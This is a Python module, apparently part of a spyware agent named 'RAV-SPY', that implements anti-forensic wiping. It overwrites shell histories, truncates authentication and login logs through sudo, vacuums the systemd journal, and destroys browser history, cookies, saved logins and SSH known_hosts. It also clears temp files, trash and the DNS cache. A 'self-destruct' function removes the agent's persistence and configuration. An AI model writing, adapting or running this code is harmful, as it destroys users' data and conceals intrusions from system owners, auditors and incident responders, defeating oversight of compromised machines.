"""
Anti-Forensic — deep trace removal: logs, cache, history, browser data, artifacts.
"""
import os
import shutil
import subprocess
from pathlib import Path
from loguru import logger

HOME = Path.home()
CONFIG_DIR = HOME / ".config" / "rav-spy"

SHELL_HISTORIES = [
    HOME / ".bash_history",
    HOME / ".zsh_history",
    HOME / ".history",
    HOME / ".python_history",
    HOME / ".local/share/fish/fish_history",
]

CACHE_DIRS = [
    HOME / ".cache",
    HOME / ".thumbnails",
]

LOG_FILES = [
    Path("/var/log/auth.log"),
    Path("/var/log/syslog"),
    Path("/var/log/messages"),
    Path("/var/log/secure"),
    Path("/var/log/kern.log"),
    Path("/var/log/dpkg.log"),
    Path("/var/log/apt/history.log"),
    Path("/var/log/apt/term.log"),
    Path("/var/log/debug"),
    Path("/var/log/faillog"),
    Path("/var/log/lastlog"),
    Path("/var/log/wtmp"),
    Path("/var/log/btmp"),
]

BROWSER_CACHE = {
    "chrome":   HOME / ".cache" / "google-chrome",
    "chromium": HOME / ".cache" / "chromium",
    "brave":    HOME / ".cache" / "BraveSoftware" / "Brave-Browser",
    "firefox":  HOME / ".cache" / "mozilla" / "firefox",
}

RECENT_FILES = [
    HOME / ".local/share/recently-used.xbel",
    HOME / ".recently-used",
    HOME / ".local/share/recently-used.xbel.*",
]

TRASH_DIRS = [
    HOME / ".local/share/Trash",
    Path("/trash"),
]

SSH_ARTIFACTS = [
    HOME / ".ssh" / "known_hosts",
    HOME / ".ssh" / "known_hosts.old",
]


def _secure_overwrite(path: Path):
    try:
        if not path.exists():
            return
        size = path.stat().st_size
        if size > 100 * 1024 * 1024:
            path.unlink(missing_ok=True)
            return
        if size > 0:
            with open(path, "wb") as f:
                f.write(os.urandom(size))
        path.unlink(missing_ok=True)
    except Exception as e:
        logger.debug(f"secure overwrite {path.name}: {e}")


def _rm_dir(path: Path):
    try:
        if path.exists():
            shutil.rmtree(str(path))
            return True
    except Exception as e:
        logger.debug(f"rm dir {path.name}: {e}")
    return False


def _run(cmd: list[str], timeout: int = 30):
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def wipe_shell_history() -> list[str]:
    results = []
    for h in SHELL_HISTORIES:
        if h.exists():
            _secure_overwrite(h)
            results.append(h.name)
    return results


def wipe_cache(cache_dirs: list[Path] | None = None) -> list[str]:
    results = []
    targets = cache_dirs or CACHE_DIRS
    for d in targets:
        if d.exists():
            for child in d.iterdir():
                try:
                    if child.is_file():
                        _secure_overwrite(child)
                    elif child.is_dir():
                        _rm_dir(child)
                    results.append(child.name)
                except Exception as e:
                    logger.debug(f"cache {child.name}: {e}")
    return results


def wipe_logs(aggressive: bool = False) -> list[str]:
    results = []
    for log in LOG_FILES:
        if log.exists():
            try:
                log.write_text("")
                results.append(log.name)
            except PermissionError:
                try:
                    _run(["sudo", "sh", "-c", f"truncate -s 0 {log}"])
                    results.append(f"{log.name} (sudo)")
                except Exception:
                    results.append(f"{log.name} (skipped - permission)")
            except Exception as e:
                results.append(f"{log.name}: {e}")
    if aggressive:
        _run(["sudo", "journalctl", "--rotate"], 10)
        _run(["sudo", "journalctl", "--vacuum-time=1s"], 60)
        results.append("journalctl rotated+vacuumed")
    return results


def wipe_browser_data() -> list[str]:
    results = []
    for name, cache_dir in BROWSER_CACHE.items():
        if cache_dir.exists():
            count = 0
            for child in cache_dir.iterdir():
                try:
                    if child.is_file():
                        child.unlink()
                        count += 1
                    elif child.is_dir():
                        shutil.rmtree(str(child), ignore_errors=True)
                        count += 1
                except Exception:
                    pass
            results.append(f"{name}: {count} items")
        prof_dir = HOME / ".config" / name
        if name != "firefox" and prof_dir.exists():
            for prof in prof_dir.glob("*"):
                hist = prof / "History"
                if hist.exists():
                    try:
                        _secure_overwrite(hist)
                        results.append(f"{name} History")
                    except Exception:
                        pass
    if (HOME / ".mozilla" / "firefox").exists():
        for prof in (HOME / ".mozilla" / "firefox").glob("*.default*"):
            targets = ["places.sqlite", "cookies.sqlite", "logins.json"]
            for t in targets:
                fp = prof / t
                if fp.exists():
                    try:
                        _secure_overwrite(fp)
                        results.append(f"firefox {t}")
                    except Exception:
                        pass
    return results


def wipe_recent_files() -> list[str]:
    results = []
    for f in RECENT_FILES:
        if f.exists():
            try:
                _secure_overwrite(f)
                results.append(f.name)
            except Exception as e:
                results.append(f"{f.name}: {e}")
    thumb_dir = HOME / ".cache" / "thumbnails"
    if thumb_dir.exists():
        for sub in ["large", "normal", "small", "fail"]:
            subdir = thumb_dir / sub
            if subdir.exists():
                for child in subdir.iterdir():
                    try:
                        child.unlink()
                    except Exception:
                        pass
                results.append(f"thumbnails/{sub}")
    return results


def wipe_temp_files() -> list[str]:
    results = []
    temp = Path("/tmp")
    rav_temp = list(temp.glob("*rav*")) + list(temp.glob("*spy*")) + list(temp.glob("*opencode*"))
    for f in rav_temp:
        try:
            if f.is_file():
                _secure_overwrite(f)
            elif f.is_dir():
                shutil.rmtree(str(f), ignore_errors=True)
            results.append(f.name)
        except Exception:
            pass
    var_tmp = Path("/var/tmp")
    rav_vtmp = list(var_tmp.glob("*rav*")) + list(var_tmp.glob("*spy*"))
    for f in rav_vtmp:
        try:
            if f.is_file():
                _secure_overwrite(f)
            elif f.is_dir():
                shutil.rmtree(str(f), ignore_errors=True)
            results.append(f.name)
        except Exception:
            pass
    return results


def wipe_trash() -> list[str]:
    results = []
    for t in TRASH_DIRS:
        if t.exists():
            try:
                for child in t.iterdir():
                    if child.is_dir():
                        shutil.rmtree(str(child), ignore_errors=True)
                    else:
                        _secure_overwrite(child)
                results.append(t.name)
            except Exception as e:
                results.append(f"{t.name}: {e}")
    return results


def wipe_ssh_artifacts() -> list[str]:
    results = []
    for f in SSH_ARTIFACTS:
        if f.exists():
            try:
                _secure_overwrite(f)
                results.append(f.name)
            except Exception:
                pass
    return results


def wipe_dns_cache() -> list[str]:
    results = []
    if shutil.which("resolvectl"):
        _run(["sudo", "resolvectl", "flush-caches"])
        results.append("systemd-resolved cache flushed")
    elif shutil.which("systemd-resolve"):
        _run(["sudo", "systemd-resolve", "--flush-caches"])
        results.append("systemd-resolve cache flushed")
    elif Path("/etc/init.d/dns-clean").exists():
        _run(["sudo", "/etc/init.d/dns-clean", "start"])
        results.append("dns-clean")
    return results


def wipe_network_history() -> list[str]:
    results = []
    nm_connections = Path("/etc/NetworkManager/system-connections")
    if nm_connections.exists():
        results.append("NM connections exist (skip - would break network)")
    if (HOME / ".config" / "NetworkMagic").exists():
        _rm_dir(HOME / ".config" / "NetworkMagic")
        results.append("NetworkMagic config")
    return results


def deep_wipe(aggressive: bool = False) -> str:
    """Comprehensive anti-forensic wipe."""
    all_results = {}

    all_results["shell_history"] = wipe_shell_history()
    all_results["cache"] = wipe_cache()
    all_results["logs"] = wipe_logs(aggressive)
    all_results["browser"] = wipe_browser_data()
    all_results["recent_files"] = wipe_recent_files()
    all_results["temp"] = wipe_temp_files()
    all_results["trash"] = wipe_trash()
    all_results["dns"] = wipe_dns_cache()
    all_results["ssh"] = wipe_ssh_artifacts()

    if aggressive:
        all_results["network"] = wipe_network_history()

    lines = ["🧹 *Anti-Forensic Deep Clean*"]
    total = 0
    for category, items in all_results.items():
        if items:
            lines.append(f"  [{category}] {', '.join(items[:5])}")
            if len(items) > 5:
                lines.append(f"    ... +{len(items) - 5} lainnya")
            total += len(items)
        else:
            lines.append(f"  [{category}] —")
    lines.append(f"\nTotal: {total} item dibersihkan")
    return "\n".join(lines)


def wipe_everything(keep_persistence: bool = False) -> str:
    """Complete self-destruct — wipe all traces including RAV-SPY itself."""
    results = []

    if not keep_persistence:
        try:
            from agent.persistence import remove
            results.append(remove("all"))
        except Exception as e:
            results.append(f"persistence: {e}")

    r = deep_wipe(aggressive=True)
    results.append(r)

    if CONFIG_DIR.exists():
        try:
            for item in CONFIG_DIR.iterdir():
                if item.is_file():
                    _secure_overwrite(item)
                elif item.is_dir():
                    shutil.rmtree(str(item), ignore_errors=True)
            shutil.rmtree(str(CONFIG_DIR), ignore_errors=True)
            results.append("RAV-SPY config wiped")
        except Exception as e:
            results.append(f"config: {e}")

    try:
        _run(["history", "-c"], 5)
        _run(["history", "-w"], 5)
    except Exception:
        pass

    return "\n".join(["💀 *Deep Self-Destruct*"] + results)
